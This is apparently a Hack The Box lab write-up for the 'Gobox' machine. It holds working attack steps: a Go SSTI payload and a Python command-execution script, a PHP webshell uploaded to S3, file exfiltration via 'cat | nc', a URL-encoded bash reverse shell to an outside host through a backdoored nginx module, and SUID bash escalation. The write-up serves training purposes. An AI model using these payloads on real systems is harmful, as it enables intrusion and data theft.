## Default Information
IP Address: 10.10.11.113\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.113    gobox.htb
```
### Rustscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.11.113:22
Open 10.10.11.113:80
Open 10.10.11.113:4566
Open 10.10.11.113:8080
```

### Nmap
We will then use the open ports obtained from rustscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | nginx | Open |
| 4566	| HTTP | nginx | Open |
| 8080	| HTTP | nginx | Open |

### Web Enumeration on port 80
Using gobuster, we can enumerate the endpoints on http://gobox.htb:80. From the output, we were able to find several endpoints.

```
http://10.10.11.113:80/css                  (Status: 301) [Size: 162] [--> http://10.10.11.113/css/]
http://10.10.11.113:80/index.php            (Status: 200) [Size: 1803]
http://10.10.11.113:80/index.html           (Status: 200) [Size: 5]
```

Navigating to http://gobox.htb:80, it seems that this site is just a static site with no possible points of exploitation.

### Web Enumeration on port 4566
Navigating to http://gobox.htb:4566, we realize that we are returned a 403 Forbidden status code. Furthurmore, web enumeration on port 4566 using gobuster does not yield any results.

### Web-content discovery on port 8080
Using Gobuster, we can enumerate the endpoints on http://gobox.htb:8080. From the output, we were able to find several endpoints.

```
http://gobox.htb:8080/forgot               (Status: 301) [Size: 43] [--> /forgot/]
```

Navigating to http://gobox.htb:8080, we are presented with a login page. Looking at the login page, we shall try some SQL Injection payloads on the email and password field. Unfortunately, we are unable to find any possibility of SQL Injection. 

Nvaigating to http://gobox.htb:8080/forget, we are presented with a "Forget Your Password" site. We realize that we can input an email into the email field and send a POST request to the corresponding endpoint

![Forget Your Password](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/forget_password.png)

Inspecting the request and response body when we send the POST request, we realize that there is a ```X-Forwarded-Server: golang``` in the response that we receive. Let us invesitgate furthur into this header

![X-Forwarded-header](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/X_Forwarded_Header.png)

## Exploit
### SSTI in Golang
Referencing the post [here](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html), we realize that we can test for SSTI in Golang using the payload ```{{.}}```. Using the payload, it seems that the site is vulnerable to SSTI. However, it also seems that SSTI in Golang is less impactful as we would need to know the source code to call on the functions to execute the code.

Nevertheless, using ```{{.}}@email.com``` seems to expose the credentials of a user

![Obtaining credentials from SSTI](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/ssti_credentials.png)

Using the credentials, we can login to http://gobox.htb:8080. Logging into the site redirects us to a page which shows the source code of the website. From the source code, we can find a DebugCmd function that executes commands on the backend.

![Source code of website](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/source_code.png)

Using the DebugCmd, we can execute commands on the backend of the website. What is interesting is that, we realize that we are running as root on the backend server. This prompts me to think that we maybe running inside a container 

![whoami](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/whoami.png)

After some testing, we realize that we are unable to create a reverse shell connection using the SSTI vulnerability. We shall create a script to allow us to execute commands.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/gobox]
└─$ python3 script.py
Command: id
uid=0(root) gid=0(root) groups=0(root)
@email.com
Command:
```

### AWS
Looking into the ```hostname```, we realize that we might be in an AWS EC2 instance.

```
Command: hostname
aws
@email.com
```

Let us try to list S3 buckets on the AWS EC2 instance. From the output, we can see that there is a bucket called website and we shall list the contents of the website bucket as well. From the output, we can see that the contents of the website bucket seems like what was hosted on the webpage.

```
Command: aws s3 ls
2022-05-15 02:30:26 website
@email.com
Command: aws s3 ls s3://website
                           PRE css/
2022-05-15 02:30:26    1294778 bottom.png
2022-05-15 02:30:26     165551 header.png
2022-05-15 02:30:26          5 index.html
2022-05-15 02:30:26       1803 index.php
@email.com
```

Looking at the contents of the website bucket, we realize that there is an index.php file. This might be the index.php file used for http://gobox.htb:80. Let us download the index.php to the /tmp/index.php and examine the file in more detail. Examining the downloaded file at /tmp/index.php, we realize that is matches the source code of index.php file at http://gobox.htb:80

```
Command: aws s3 cp s3://website/index.php /tmp/index.php
download: s3://website/index.php to ../../tmp/index.php         
@email.com
```

Next, let us write a webshell on the /tmp directory and copy it over to the website bucket on s3.

```
Command: echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
@email.com
Command: cat /tmp/shell.php
<?php system($_GET["cmd"]); ?>
@email.com
Command: aws s3 cp /tmp/shell.php s3://website      
upload: ../../tmp/shell.php to s3://website/shell.php             
@email.com
```

Navigating to http://gobox.htb:80/shell.php?cmd=id will then return us the output of the ```id``` command. However, we realize that the output is now changed to www-data which means that we are now out of the container. 

![Webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/webshell.png)

Afterwards, we can use a reverse shell payload on the ```cmd``` parameter and spawn a reverse shell connection. However, we would need to url encode the payload for reverse shell connection.

![Reverse shell connection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/reverse_shell.png)

### Obtaining user flag
```
www-data@gobox:/home/ubuntu$ cat /home/ubuntu/user.txt
cat /home/ubuntu/user.txt
<Redacted user flagcd D>
```

### Linpeas Enumeration
Using the linpeas script, we can see that this machine is vulnerable to CVE-2021-4034. However, executing the script for CVE-2021-4034 fails as the build-time dependency ```cc1``` could not be found. 

```
www-data@gobox:/dev/shm/exploit/CVE-2021-4034$ make
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc: fatal error: cannot execute ‘cc1’: execvp: No such file or directory
compilation terminated.
make: *** [Makefile:21: pwnkit.so] Error 1
```

Checking the mounted file systems also did not yield any results as the /dev/sda2 file system is mounted to /boot directory

```
www-data@gobox:/dev/shm$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
udev                               1.9G     0  1.9G   0% /dev
tmpfs                              391M  1.3M  390M   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  3.6G  5.7G  40% /
tmpfs                              2.0G  804K  2.0G   1% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2                          976M  107M  803M  12% /boot
overlay                            9.8G  3.6G  5.7G  40% /var/lib/docker/overlay2/28dde32a8d19033c33b3170999881574bf9c8a79fe4b58f987859b2cee445305/merged
overlay                            9.8G  3.6G  5.7G  40% /var/lib/docker/overlay2/67b503aed97c2df3e766247f5a4a50b15fadddbf00f8e444b7c0a9c924cfa2fa/merged
shm                                 64M     0   64M   0% /var/lib/docker/containers/411617fa0ff82df55bb6d37beba90bf078c519961e09180498aa454e399f5727/mounts/shm
shm                                 64M     0   64M   0% /var/lib/docker/containers/3f5324b3be407cbb06d4f89479d1b0f957ed66b5891d2c4d95dbea428d3155e7/mounts/shm
```

Using linpeas script, we can find out that there there is a docker-proxy that is being executed. From the processes we can see that port 9000 acts as a proxy for port 4566 and port 9001 acts as a proxy for port 80

```
root        1157  0.0  0.0 1149100 3804 ?        Sl   02:55   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 9001 -container-ip 172.28.0.2 -container-port 80
root        1177  0.0  0.0 1222832 3800 ?        Sl   02:55   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 9000 -container-ip 172.28.0.3 -container-port 4566
```

We can also find that there is a service running on port 8000 of the localhost but we do not know the service that is running on port 8000

```
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      - 
```

### Nginx Enumeration
Looking up /etc/nginx/sites-enabled/default, we are able to find the configuration of the nginx servers. Inspecting the configuration details for port 4566, we can see that this server returns 403 as the ```$http_authorization``` is not set to be the specified value.

Unfortunately, we know from [here](https://stackoverflow.com/questions/5110361/what-is-the-http-authorization-environment-variable) that the ```$http_authorization``` seems to be a variable that is set on the server-side and we are unable to modify it from the client-side. 
```
server {
        listen 4566 default_server;
        root /var/www/html;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)") {
                    return 403;
                }
                proxy_pass http://127.0.0.1:9000;
        }

}
```

Another interesting configuration that we are able to find from /etc/nginx/sites-enabled/default is that port 8000 just specifies ```command on``` under the location.

```
server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}
```

### NginxExecute
Looking up the github repository from (here)[https://github.com/limithit/NginxExecute], we are able to find a similiar configuration file as the configuration for port 8000. However, executing the curl command to http://127.0.0.1:8000/?system.run[id] gives an empty reply.

```
www-data@gobox:/etc/nginx/sites-enabled$ curl -g http://127.0.0.1:8000/?system.run[id]  
curl -g http://127.0.0.1:8000/?system.run[id]
curl: (52) Empty reply from server
```

Researching on the NginxExecute exploit, it seems that this exploit requires ngx_http_execute_module.so to be loaded. Let us first take a look at /etc/nginx/nginx.conf file to check if we can find where ngx_http_execute_module.so is loaded. From the nginx.conf file, we can see that the configuration files from /etc/nginx/modules-enabled are being included when the server is deployed.

```
include /etc/nginx/modules-enabled/*.conf;
```

Looking up the configuration files in /etc/nginx/modules-enabled, we can see that ngx_http_execute.so is being loaded in the 50-backdoor.conf file. 

```
www-data@gobox:/etc/nginx/modules-enabled$ cat 50-backdoor.conf
cat 50-backdoor.conf
load_module modules/ngx_http_execute_module.so;
```

Since ngx_http_execute_module.so is being loaded in the configuration file, the exploit should have worked. Let us first find the location of the ngx_http_execute_module.so file 

```
www-data@gobox:/etc/nginx/modules-enabled$ find / -name ngx_http_execute_module.so 2>/dev/null
find / -name ngx_http_execute_module.so 2>/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
```

Afterwards, let us trasnfer the ngx_http_execute_module.so file to our local machine so that we can examine the file in greater detail

```
www-data@gobox:/usr/lib/nginx/modules$ cat ngx_http_execute_module.so | nc 10.10.16.6 2000
cat ngx_http_execute_module.so | nc 10.10.16.6 2000
www-data@gobox:/usr/lib/nginx/modules$ 
-------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/gobox]
└─$ nc -nlvp 2000 > ngx_http_execute_module.so
listening on [any] 2000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.113] 53236
^C
┌──(kali㉿kali)-[~/Desktop/gobox]
└─$  
```

### Analysis of ngx_http_execute_module.so
Using IDA to analyze ngx_http_execute_module.so, we can see that in the ngx_http_execute_handler function, there is a ```memcmp``` function called to compare a variable with the string ```ippsec.run```and if the comparison returns true the response headers will be set

![ngx_http_execute_handler](https://github.com/joelczk/writeups/blob/main/HTB/Images/Gobox/ngx_http_execute_handler.png)

Using the strings command, we are also able to obtain ```ippsec.run```

```
www-data@gobox:/usr/lib/nginx/modules$ strings ngx_http_execute_module.so | grep ".run"
strings ngx_http_execute_module.so | grep ".run"
ippsec.run
```

Knowing that, let us try the Nginx Execute exploit again using ippsec.run instead this time. This time, the exploit can be carried out successfully

```
www-data@gobox:/usr/lib/nginx/modules$ curl -g http://127.0.0.1:8000/?ippsec.run[id]
curl -g http://127.0.0.1:8000/?ippsec.run[id]
uid=0(root) gid=0(root) groups=0(root)
```

Using this, we can create a reverse shell connection to our local machine using a reverse shell payload. However, we realize that the connection will be disconnected after a short while. (NOTE: The reverse shell payload must be url encoded)

```
www-data@gobox:/usr/lib/nginx/modules$ curl -g http://127.0.0.1:8000/?ippsec.run[%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F2000%200%3E%261%27]
curl -g http://127.0.0.1:8000/?ippsec.run[%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F2000%200%3E%261%27]
curl: (52) Empty reply from server
-------------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/gobox]
└─$ nc -nlvp 2000 
listening on [any] 2000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.113] 53246
bash: cannot set terminal process group (35345): Inappropriate ioctl for device
bash: no job control in this shell
root@gobox:/# exit
```

### Obtaining root flag
Executing the id command using the NginxExecute exploit tells us that we are now running as root. Hence, we are able to extract the root flag by replacing the ```id``` command with ```cat /root/root.txt``` (NOTE: We will have to url encode the payload for it to work)

```
www-data@gobox:/usr/lib/nginx/modules$ curl -g http://127.0.0.1:8000/?ippsec.run[cat%20%2Froot%2Froot.txt]
curl -g http://127.0.0.1:8000/?ippsec.run[cat%20%2Froot%2Froot.txt]
<Redacted root flag>
```

## Post-Exploitation
### Privilege Escalation using SUID
Making use of the NginxExecute exploit, we still can obtain a privileged shell. Firstly, we can copy the /bin/bash binary into our /tmp directory using ```cp /bin/bash /tmp``` (NOTE: This exploit only works for /tmp but not /dev/shm)

```
www-data@gobox:/tmp$ curl -g http://127.0.0.1:8000/?ippsec.run[cp%20%2Fbin%2Fbash%20%2Ftmp]
curl -g http://127.0.0.1:8000/?ippsec.run[cp%20%2Fbin%2Fbash%20%2Ftmp]
curl: (52) Empty reply from server
www-data@gobox:/tmp$ ls /tmp
ls /tmp
bash
iptables-set
php-fpm.sock
systemd-private-f4088fc163ce4e7eaad866e2129c5987-incron.service-69FXUe
systemd-private-f4088fc163ce4e7eaad866e2129c5987-systemd-logind.service-9DJbUf
systemd-private-f4088fc163ce4e7eaad866e2129c5987-systemd-resolved.service-4vFjFh
systemd-private-f4088fc163ce4e7eaad866e2129c5987-systemd-timesyncd.service-GqVjkf
tmux-33
vmware-root_683-4013919829
www-data@gobox:/tmp$
```

Next, we will have to set the SUID to our bash binary in the /tmp directory using ```chmod 4777 /tmp/bash```

```
www-data@gobox:/tmp$ curl -g http://127.0.0.1:8000/?ippsec.run[chmod%204777%20%2Ftmp%2Fbash]
curl -g http://127.0.0.1:8000/?ippsec.run[chmod%204777%20%2Ftmp%2Fbash]
curl: (52) Empty reply from server
www-data@gobox:/tmp$ ls -la /tmp/bash
ls -la /tmp/bash
-rwsrwxrwx 1 root root 1183448 May 16 06:09 /tmp/bash
```

Afterwards, we can execute the /tmp/bash binary with the ```-p``` flag to preserve the privilege

```
www-data@gobox:/tmp$ /tmp/bash -p
/tmp/bash -p
bash-5.0# whoami
whoami
root
bash-5.0#  
```
### Alternative method of obtaining root flag

Another alternative method of obtaining the root flag is to make use of the ngx_http_execute.so module and do a curl command to execute the ```cat``` command 
to view the contents of the root flag

```
www-data@gobox:/usr/lib/nginx/modules$ curl -g http://127.0.0.1:8000/?ippsec.run[cat%20%2Froot%2Froot.txt]
curl -g http://127.0.0.1:8000/?ippsec.run[cat%20%2Froot%2Froot.txt]
<Redacted root flag>
```
### Script for executing commands from SSTI in golang

```
import requests
import re
from html import unescape

def ssti(url,command):
    command = command.replace('"', '\\"')
    payload = '{{.DebugCmd "' + str(command) + '"}}@email.com'
    data = {
        "email": payload,
    }
    r = requests.post(url, data=data)
    capture_re = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)
    result = capture_re.search(r.text).group(1)
    result = unescape(unescape(result))
    output = result.replace("@email.com","").strip()
    print(output)

def main(url):
    while True:
        command = input("Command: ")
        try:
            ssti(url,command)
        except Exception as e:
            print(e)
            pass
        if command.lower() == "exit":
            break

if __name__ == '__main__':
    url = "http://gobox.htb:8080/forgot/"
    main(url) 
```
